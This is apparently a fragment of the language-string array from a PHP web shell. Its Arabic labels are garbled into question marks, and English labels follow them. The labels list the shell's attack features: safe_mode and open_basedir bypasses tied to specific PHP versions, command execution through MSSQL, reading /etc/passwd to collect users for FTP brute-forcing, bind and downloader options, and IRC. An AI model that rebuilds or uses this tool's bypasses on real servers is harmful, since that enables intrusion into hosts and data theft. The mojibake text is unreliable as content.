...
'ar_butt7' =>'???',
'ar_text31'=>'C???? U?? ????I',
'ar_text32'=>'E???? ??I php ?? ???? IC?? eval',
'ar_text33'=>'Test bypass open_basedir with cURL functions',
'ar_butt8' =>'CIEEC?',
'ar_text34'=>'??C?? C????CE ?? ???? EU?? include',
'ar_text35'=>'??C?? C????CE ?? ???? EU?? Mysql',
'ar_text36'=>'C??C?IE . C??I??',
'ar_text37'=>'C?? C???EII?',
'ar_text38'=>'???E C?????',
'ar_text39'=>'C??C?IE',
'ar_text40'=>'??IE ?? ?IC?? C??C?IE',
'ar_butt9' =>'??IE',
'ar_text41'=>'??U C???IE ??',
'ar_text42'=>'E?I?? C????CE',
'ar_text43'=>'C???? C???CI E?I???',
'ar_butt10'=>'??U',
'ar_text44'=>'?CE?E??? C?E?I?? ??? ??C C???? ??? E???',
'ar_text45'=>'E? C???U',
'ar_text46'=>'??? phpinfo()',
'ar_text47'=>'???E C??EU??CE ?? php.ini',
'ar_text48'=>'??? ???CE C?U temp',
'ar_butt11'=>'E???? C????',
'ar_text49'=>'??? C????EE ?? C??????',
'ar_text50'=>'??? ?????CE C??C??E C??????E',
'ar_text51'=>'??? ?????CE C??C??E',
'ar_text52'=>'E?E ??',
'ar_text53'=>'?? C???C?',
'ar_text54'=>'E?E ?? ?? ?? C????CE',
...
'ar_text76'=>'C?E?E ?? ?? ?? ???CE E?C??? find',
'ar_text80'=>'C????',
'ar_text81'=>'C??E?C?CE',
'ar_text82'=>'??C?I C?E?C?CE',
'ar_text83'=>'EOU?? C?? C?E??C?',
'ar_text84'=>'C?E??C? ?C?IE',
'ar_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'ar_text86'=>'E???? ???CE ?? C??????',
'ar_butt14'=>'E????',
'ar_text87'=>'E???? ???CE ?? ICI? C?C? E? E?',
'ar_text88'=>'????? C?C? E? E?:C?????',
'ar_text89'=>'??? ?? C?C? E? E?',
'ar_text90'=>'C?E???? C??',
'ar_text91'=>'C?O?E',
'ar_text92'=>'?? U?? C?C?O?E',
'ar_text93'=>'C?C? E? E?',
'ar_text94'=>'EI??? C?C? E? E?',
'ar_text95'=>'?C??E C???EII???',
'ar_text96'=>'?? ??E?? ??E ?C??E C???EII???',
'ar_text97'=>'E? C????: ',
'ar_text98'=>'E? E??C?: ',
'ar_text99'=>'* C?EII? C??C? C???EII??? ?? ??? /etc/passwd ?II?? ??U ftp',
'ar_text100'=>'C??C? ??? C?? ICI? C?C? E? E?',
'ar_text101'=>'C?EII? C?C?C?? ?????? ?EI????C',
'ar_text102'=>'II?CE C?E??I',
'ar_text103'=>'C??C? E??I',
'ar_text104'=>'C??C? ??? C?? C?C????',
'ar_text105'=>'???',
'ar_text106'=>'?U?',
'ar_text107'=>'C??????',
'ar_butt15'=>'???C?',
...
'ar_text109'=>'?I??',
'ar_text110'=>'???',
'ar_text111'=>'????? ??C?I C?E?C?CE : C?????',
'ar_text112'=>'??C?E C????CE ?? ???? EU?E IC?? mb_send_mail',
'ar_text113'=>'??C?E ??E?? C????ICE ?? ???? via imap_list',
'ar_text114'=>'??C?E C????CE ?? ???? EU?E via imap_body',
'ar_text115'=>'??C?E C????CE ?? ???? compress.zlib://',
'ar_text116'=>'??I ??',
'ar_text117'=>'C??',
'ar_text118'=>'E? ??I C????',
'ar_text119'=>'?C??E??? C???I',
'ar_err0'=>'I?C? ! ?C???? C??ECEE ??? ??C C???? ',
'ar_err1'=>'I?C? ! U?? ?CI? ??? ??C?? ??C C???? ',
'ar_err2'=>'I?C?! ?C???? C?C?OC? ',
'ar_err3'=>'I?C?! U?? ?CI? ??? C?CE?C? EC?C? E? E?',
'ar_err4'=>'I?C? ! ?CE?E??? C?II?? C?? ????? C?C? E? E?',
'ar_err5'=>'I?C? ! ?CE?E??? EU?? C????I ?? C?C? E? E?',
'ar_err6'=>'I?C? ! ?CE?E??? C??C? ??C??',
'ar_err7'=>'C?E??I C???',
'ar_text200'=>'copy()??C?E C????CE ?? ???? EU?E',
'ar_text202'=>'??C? C???? C???CI ??C?E?',
'ar_text300'=>'curl()??C?? C????CE ?? ???? EU?E',
'ar_text203'=>'ini_restore()??C?E C????CE ?? ???? EU?E',
'ar_text204'=>'error_log()??C?? C????CE ?? ???? EU??',
'ar_text205'=>'???? C?O? ??? ??C C???C?',
'ar_text206'=>'??C?? ??E??CE C????I',
'ar_text207'=>'??C?? ??E??CE C????ICE ?? ???? EU?? reg_glob',
'ar_text208'=>'E???? C?C?C?? ?? C???? C?C?? ?? ???? C?I?C?',
'ar_text209'=>'??C?? ??E??CE C????ICE ?? ???? EU?? root',
'ar_text210'=>'?? EO??? C???I ',
'ar_text211'=>'::C??C? C???? ??I::',
'ar_text212'=>'php.ini C??C? C???? ??I ?? ???? ??? ???',
'ar_text213'=>'htacces ???C? C???I ?????E? ?? ???? ??? ???',
'ar_text214'=>'??? C?CI??',
'ar_text215'=>'???C? C?????? IRC ',
'ar_text216'=>'# ??? C?U??? ??',
'ar_text217'=>'C?? C?????? C??IE??',
'ar_text218'=>'????C? C???? ??I ini_restore ??? ??? ??E?? ??? EU??',
'ar_text219'=>'??E ???CE C?? C?????? ?EU?? C???C EC???? C?C??',
'ar_text220'=>'C?E??C? C????CE ?? ???? EU?? symlink C?I??? C?C???',
'ar_text221'=>'?U? C????CE ?E?????C ?? C?????(E?I E?????C ???C?? U?? C?EICI C???? ?C?EICI? C??CE?)1',
'ar_text222'=>'C?E??C? C????CE ?? ???? EU?? symlink C?I??? C?EC???',
'ar_text223'=>'??C?? C????CE ?? ???? C?I?C?',
'ar_text224'=>'PLUGIN ??C?? C????CE ?? ???? EU?? ',
'ar_text143'=>'C?E?E: ',
'ar_text65'=>'C?OC?',


'ar_text33'=>'EI?? C???? ??I E open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'ar_text34'=>'??C?? C????CE ?? ???? EU?E  include function',
'ar_text35'=>'??C?? C????CE ?? ???? EU?E  load file in mysql',
'ar_text85'=>'??C?? C????CE ?? ???? EU?E  commands execute via MSSQL server',
'ar_text112'=>'??C?? C????CE ?? ???? EU?E  function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'ar_text113'=>'EI?? C???? ??I E safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'ar_text114'=>'EI?? C???? ??I E safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'ar_text115'=>'EI?? C???? ??I E safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'ar_text116'=>'Copy from',
'ar_text117'=>'to',
'ar_text118'=>'File copied',
'ar_text119'=>'Cant copy file',
'ar_text120'=>'EI?? C???? ??I E safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'ar_text121'=>'EI?? C???? ??I E open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'ar_text122'=>'EI?? C???? ??I E open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'ar_text123'=>'EI?? C???? ??I E open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'ar_text124'=>'EI?? C???? ??I E open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'ar_text126'=>'EI?? C???? ??I E open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'ar_text127'=>'EI?? C???? ??I E open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'ar_text128'=>'Modify/Access file (touch)',
'ar_text129'=>'EI?? C???? ??I E open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'ar_text130'=>'EI?? C???? ??I E open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'ar_text131'=>'EI?? C???? ??I E open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'ar_text132'=>'EI?? C???? ??I E open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'ar_text133'=>'EI?? C???? ??I E open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
...
'ar_text142'=>'Downloaders',
'ar_text143'=>'Temp: ',
'ar_text144'=>'??C?? C????CE ?? ???? EU?E  load file in mysqli',
'ar_text145'=>'EI?? C???? ??I E open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
...
'ar_err7'=>'Mail send',
'ar_text125'=>'Data',
'ar_text225'=>'??? ??? ?E?EI?? ?? I?C? ?C?I? C?E?C?CE ? 4.4.7 / 5.2.3 PHP ',
'ar_text226'=>'EI?? C???? ??I EEU?? Root Directory: ',
'ar_text227'=>'??? ??? ?EI?? C??? ??I EEU?? 4.4.2/5.1.2',
'ar_text228'=>'??? ??? ?EI?? C???C?? ???EIE C??? E?  ',
'ar_text230'=>'??? ??? ?????? ???CE C????? ???C?? C?????? EI?? EO??? ',
'ar_text151'=>'EI?? C???? ??I E  chdir()and ftok() (PHP <= 5.2.6)',
'ar_text161'=>'EI?? C???? ??I E  posix_access() (posix ext) (PHP <= 5.2.6)',
'ar_text147'=>'',
'ar_text148'=>'',
'ar_text149'=>'',
'ar_text150'=>'',
'ar_text159'=>'?????CE ?? egy spider',
'ar_text152'=>'CI? C?CIEC?',
'ar_text153'=>'I??? ',
'ar_text154'=>'??? C?I?? ????? ',
'ar_text155'=>'??? C??CI ',
'ar_text156'=>'??? C???I ',
'ar_text157'=>'C?E???? ?? C???? CEO ',
'ar_text158'=>'CI?CE C?EO???  ',
'ar_text160'=>'C??????  ',
'ar_text162'=>'C??C? C?I?C?  ?EI?? C???? ??I ?? I?C? ionCube (PHP <= 5.2.4)',
'ar_text163'=>'EOU?? C?E??? ??? C?????? ',
'ar_text170'=>' EI?? C???? ??I ?C?I?C? E  Posix_getpw(PHP <= 4.2.0)',
'ar_text171'=>' PHP (Win32std) Extension EI?? C???? ??I ?EI?? C?I?C? (PHP <= 5.2.3)',
'ar_text180'=>'C??? ??C?UCE? ?CE?? E? ',
/* --------------------------------------------------------------- */
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_butt3' =>'Bind',
